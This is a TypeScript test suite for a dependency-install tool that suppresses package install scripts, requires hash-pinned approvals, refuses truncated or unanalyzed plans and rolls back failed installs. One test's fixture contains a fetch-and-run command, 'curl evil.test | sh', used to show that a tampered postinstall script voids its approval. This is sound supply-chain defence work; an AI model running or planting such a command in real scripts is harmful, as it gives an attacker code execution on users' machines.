import { expect, test } from "bun:test";
import { type ApplyDeps, applyTransaction } from "../../src/graph/apply.ts";
import { hashScript, type ScriptApproval } from "../../src/graph/approvals.ts";
import type { GraphChange } from "../../src/graph/delta.ts";
import type { TransactionPlan } from "../../src/graph/plan.ts";

const SCRIPT = "node build.js";

function change(over: Partial<GraphChange> = {}): GraphChange {
  return {
    name: "esbuild",
    version: "0.25.8",
    direct: true,
    hooks: ["postinstall"],
    newHooks: ["postinstall"],
    deprecated: false,
    platformSpecific: false,
    requiredBy: [],
    ...over,
  };
}

function plan(over: Partial<TransactionPlan> = {}): TransactionPlan {
  const scripted = over.delta?.newScriptSurface ?? [];
  return {
    schema_version: 1,
    plan_id: "wtxn_plan",
    command: "npm install esbuild",
    manager: "npm",
    root: "/repo",
    direct: [{ name: "esbuild", range: "0.25.8" }],
    graph_before: "sha256:before",
    graph_after: "sha256:after",
    delta: {
      added: [],
      changed: [],
      removed: [],
      unchanged: 0,
      scriptSurface: scripted,
      newScriptSurface: scripted,
      platformArtifacts: [],
      deprecatedIntroduced: [],
    },
    artifacts: [
      {
        package: "esbuild",
        version: "0.25.8",
        integrity: "sha512-esbuild",
        verdict: "allow",
        summary: "no findings",
        categories: [],
      },
    ],
    unresolved: [],
    conflicts: [],
    truncated: false,
    coverage: { analyzed: 1, changed: 1, ratio: 1 },
    decision: "allow",
    reasons: [],
    next_actions: [],
    ...over,
  };
}

const approval = (over: Partial<ScriptApproval> = {}): ScriptApproval => ({
  schema_version: 1,
  package: "esbuild",
  version: "0.25.8",
  integrity: "sha512-esbuild",
  hook: "postinstall",
  script_hash: hashScript(SCRIPT),
  scope: "repo",
  approved_at: "2026-01-01T00:00:00.000Z",
  ...over,
});

function makeDeps(over: Partial<ApplyDeps> = {}, projectScripts: Record<string, string> = {}) {
  const commands: string[][] = [];
  const files: Record<string, string> = {
    "/repo/package.json": JSON.stringify({ name: "app", scripts: projectScripts }),
  };
  const deps: ApplyDeps = {
    exec: (cmd) => {
      commands.push(cmd);
      return { code: 0 };
    },
    readFile: (path) => files[path] as string,
    writeFile: (path, data) => {
      files[path] = data;
    },
    exists: (path) => path in files,
    scriptBody: () => Promise.resolve(SCRIPT),
    approvals: [],
    analyzerVersion: "test",
    ...over,
  };
  return { deps, commands, files };
}

test("a clean plan installs with scripts suppressed and produces an applied receipt", async () => {
  const { deps, commands } = makeDeps();
  const receipt = await applyTransaction(plan(), deps);
  expect(receipt.result).toBe("applied");
  expect(commands[0]).toEqual(["npm", "install", "esbuild@0.25.8", "--ignore-scripts"]);
  expect(receipt.verification.install).toBe("pass");
});

test("scripts are suppressed even when every script is approved", async () => {
  const { deps, commands } = makeDeps({ approvals: [approval()] });
  await applyTransaction(plan({ delta: { ...plan().delta, newScriptSurface: [change()] } }), deps);
  expect(commands[0]).toContain("--ignore-scripts");
});

test("an unapproved install script refuses the transaction rather than running it", async () => {
  const { deps, commands } = makeDeps();
  const receipt = await applyTransaction(
    plan({ delta: { ...plan().delta, newScriptSurface: [change()] } }),
    deps,
  );
  expect(receipt.result).toBe("refused");
  expect(receipt.reason).toContain("unapproved install scripts");
  expect(commands).toEqual([]);
});

test("an approval that matches the exact artifact lets the transaction proceed", async () => {
  const { deps } = makeDeps({ approvals: [approval()] });
  const receipt = await applyTransaction(
    plan({ delta: { ...plan().delta, newScriptSurface: [change()] } }),
    deps,
  );
  expect(receipt.result).toBe("applied");
  expect(receipt.approvals).toHaveLength(1);
});

test("an approval for a different version does not carry over", async () => {
  const { deps } = makeDeps({ approvals: [approval({ version: "0.25.7" })] });
  const receipt = await applyTransaction(
    plan({ delta: { ...plan().delta, newScriptSurface: [change()] } }),
    deps,
  );
  expect(receipt.result).toBe("refused");
});

test("an approval is void once the script body changes", async () => {
  const { deps } = makeDeps({
    approvals: [approval()],
    scriptBody: () => Promise.resolve("node build.js && curl evil.test | sh"),
  });
  const receipt = await applyTransaction(
    plan({ delta: { ...plan().delta, newScriptSurface: [change()] } }),
    deps,
  );
  expect(receipt.result).toBe("refused");
});

test("--allow-unapproved proceeds but the receipt still records the suppression", async () => {
  const { deps } = makeDeps();
  const receipt = await applyTransaction(
    plan({ delta: { ...plan().delta, scriptSurface: [change()], newScriptSurface: [change()] } }),
    deps,
    { allowUnapproved: true },
  );
  expect(receipt.result).toBe("applied");
  expect(receipt.suppressed_scripts).toEqual([
    { package: "esbuild", version: "0.25.8", hooks: ["postinstall"] },
  ]);
});

test("a blocked plan is refused, never applied", async () => {
  const { deps, commands } = makeDeps();
  const receipt = await applyTransaction(plan({ decision: "block" }), deps);
  expect(receipt.result).toBe("refused");
  expect(commands).toEqual([]);
});

test("a failed install rolls the manifest back", async () => {
  const { deps, files } = makeDeps({ exec: () => ({ code: 1 }) });
  const before = files["/repo/package.json"];
  const receipt = await applyTransaction(plan(), deps);
  expect(receipt.result).toBe("rolled_back");
  expect(receipt.verification.install).toBe("fail");
  expect(files["/repo/package.json"]).toBe(before as string);
});

test("project verification runs the scripts the project actually has", async () => {
  const commands: string[][] = [];
  const { deps } = makeDeps(
    {
      exec: (cmd) => {
        commands.push(cmd);
        return { code: 0 };
      },
    },
    { test: "bun test", build: "bun build" },
  );
  const receipt = await applyTransaction(plan(), deps);
  expect(commands.slice(1)).toEqual([
    ["npm", "run", "test"],
    ["npm", "run", "build"],
  ]);
  expect(receipt.verification).toMatchObject({ test: "pass", typecheck: "skipped", build: "pass" });
});

test("a failing verification step rolls back and names the step", async () => {
  const { deps } = makeDeps(
    {
      exec: (cmd) => ({ code: cmd.includes("test") ? 1 : 0 }),
    },
    { test: "bun test", build: "bun build" },
  );
  const receipt = await applyTransaction(plan(), deps);
  expect(receipt.result).toBe("rolled_back");
  expect(receipt.reason).toContain("test");
  expect(receipt.verification.build).toBe("skipped");
});

test("--no-verify installs without running the project scripts", async () => {
  const commands: string[][] = [];
  const { deps } = makeDeps(
    {
      exec: (cmd) => {
        commands.push(cmd);
        return { code: 0 };
      },
    },
    { test: "bun test" },
  );
  const receipt = await applyTransaction(plan(), deps, { verify: false });
  expect(commands).toHaveLength(1);
  expect(receipt.verification.test).toBe("skipped");
});

test("a graph transaction with no direct packages installs the manifest", async () => {
  const { deps, commands } = makeDeps();
  await applyTransaction(plan({ direct: [] }), deps);
  expect(commands[0]).toEqual(["npm", "install", "--ignore-scripts"]);
});

test("each manager gets its own install verb and suppression mechanism", async () => {
  for (const [manager, expected] of [
    ["pnpm", ["pnpm", "add", "esbuild@0.25.8", "--ignore-scripts"]],
    ["yarn", ["yarn", "add", "esbuild@0.25.8"]],
    ["bun", ["bun", "add", "esbuild@0.25.8", "--ignore-scripts"]],
  ] as const) {
    const { deps, commands } = makeDeps();
    await applyTransaction(plan({ manager }), deps);
    expect(commands[0]).toEqual([...expected]);
  }
});

test("the receipt carries both graph digests and a policy digest", async () => {
  const { deps } = makeDeps();
  const receipt = await applyTransaction(plan(), deps);
  expect(receipt.graph_before).toBe("sha256:before");
  expect(receipt.graph_after).toBe("sha256:after");
  expect(receipt.policy_digest).toStartWith("sha256:");
  expect(receipt.transaction_id).toStartWith("wtxn_");
});

test("the same plan always yields the same transaction id", async () => {
  const first = await applyTransaction(plan(), makeDeps().deps);
  const second = await applyTransaction(plan(), makeDeps().deps);
  expect(first.transaction_id).toBe(second.transaction_id);
});

test("a project without a manifest still applies without crashing", async () => {
  const { deps } = makeDeps({ exists: () => false });
  const receipt = await applyTransaction(plan(), deps);
  expect(receipt.result).toBe("applied");
});

test("a corrupt manifest degrades to running no verification steps", async () => {
  const files: Record<string, string> = { "/repo/package.json": "{not json" };
  const receipt = await applyTransaction(plan(), {
    exec: () => ({ code: 0 }),
    readFile: (path) => files[path] as string,
    writeFile: () => undefined,
    exists: (path) => path in files,
    scriptBody: () => Promise.resolve(SCRIPT),
    approvals: [],
    analyzerVersion: "test",
  });
  expect(receipt.result).toBe("applied");
  expect(receipt.verification.test).toBe("skipped");
});

test("a truncated plan is refused, because it was never fully reviewed", async () => {
  const { deps, commands } = makeDeps();
  const receipt = await applyTransaction(plan({ truncated: true }), deps);
  expect(receipt.result).toBe("refused");
  expect(receipt.reason).toContain("truncated");
  expect(commands).toEqual([]);
});

test("a plan with unanalyzed packages is refused rather than installed", async () => {
  const { deps, commands } = makeDeps();
  const receipt = await applyTransaction(
    plan({
      artifacts: [
        {
          package: "mystery",
          version: "1.0.0",
          verdict: "unchecked",
          summary: "beyond the analysis budget for this plan",
          categories: [],
        },
      ],
    }),
    deps,
  );
  expect(receipt.result).toBe("refused");
  expect(receipt.reason).toContain("never analyzed");
  expect(commands).toEqual([]);
});

test("a script approval does not license incomplete analysis", async () => {
  const { deps } = makeDeps({ approvals: [approval()] });
  const receipt = await applyTransaction(
    plan({
      truncated: true,
      delta: { ...plan().delta, scriptSurface: [change()], newScriptSurface: [change()] },
    }),
    deps,
  );
  expect(receipt.result).toBe("refused");
  expect(receipt.reason).toContain("truncated");
});

test("incomplete analysis can be overridden only by its own explicit option", async () => {
  const { deps } = makeDeps();
  const receipt = await applyTransaction(plan({ truncated: true }), deps, {
    verify: false,
    allowIncompleteAnalysis: true,
  });
  expect(receipt.result).toBe("applied");
});

test("bun installs with scripts suppressed like npm and pnpm", async () => {
  const { deps, commands } = makeDeps();
  await applyTransaction(plan({ manager: "bun" }), deps);
  expect(commands[0]).toEqual(["bun", "add", "esbuild@0.25.8", "--ignore-scripts"]);
});
